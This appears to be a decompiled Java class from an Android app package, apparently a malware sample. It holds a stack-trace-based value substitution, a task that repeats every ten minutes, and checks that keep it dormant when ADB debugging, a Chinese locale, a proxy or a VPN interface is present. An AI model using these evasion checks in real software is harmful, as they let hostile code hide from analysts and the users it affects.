package com.asshow.asshow.b;

import android.content.Context;
import android.net.Proxy;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import com.asshow.asshow.AS;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public final class b {

    /* renamed from: a  reason: collision with root package name */
    private static String f400a = com.asshow.asshow.a.b.j;

    public static String a(String str) {
        StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
        int length = stackTrace.length;
        int i = 0;
        while (true) {
            if (i >= length) {
                break;
            }
            StackTraceElement stackTraceElement = stackTrace[i];
            if (f400a.equalsIgnoreCase(stackTraceElement.getClassName())) {
                return ((com.asshow.asshow.a.b.l.equalsIgnoreCase(stackTraceElement.getMethodName()) || com.asshow.asshow.a.b.m.equalsIgnoreCase(stackTraceElement.getMethodName())) && !TextUtils.isEmpty(AS.f393a) && AS.c) ? AS.f393a : str;
            }
            i++;
        }
        return str;
    }

    public static void a(Context context, String str) {
        Executors.newScheduledThreadPool(1).scheduleAtFixedRate(new c(context, str), 5L, 600L, TimeUnit.SECONDS);
    }

    private static boolean a() {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            if (networkInterfaces == null) {
                return false;
            }
            Iterator it = Collections.list(networkInterfaces).iterator();
            while (it.hasNext()) {
                NetworkInterface networkInterface = (NetworkInterface) it.next();
                if (networkInterface.isUp() && networkInterface.getInterfaceAddresses().size() != 0 && ("tun0".equals(networkInterface.getName()) || "ppp0".equals(networkInterface.getName()))) {
                    return true;
                }
            }
            return false;
        } catch (Throwable th) {
            th.printStackTrace();
            return false;
        }
    }

    public static boolean a(Context context) {
        int port;
        String str;
        if (Build.VERSION.SDK_INT >= 17 && Settings.Secure.getInt(context.getContentResolver(), "adb_enabled", 0) > 0) {
            return false;
        }
        String language = Locale.getDefault().getLanguage();
        if (language != null && language.equals(Locale.CHINESE.getLanguage())) {
            return false;
        }
        if (Build.VERSION.SDK_INT >= 14) {
            str = System.getProperty("http.proxyHost");
            String property = System.getProperty("http.proxyPort");
            if (property == null) {
                property = "-1";
            }
            port = Integer.parseInt(property);
        } else {
            String host = Proxy.getHost(context);
            port = Proxy.getPort(context);
            str = host;
        }
        return !(!TextUtils.isEmpty(str) && port != -1) && !a();
    }
}
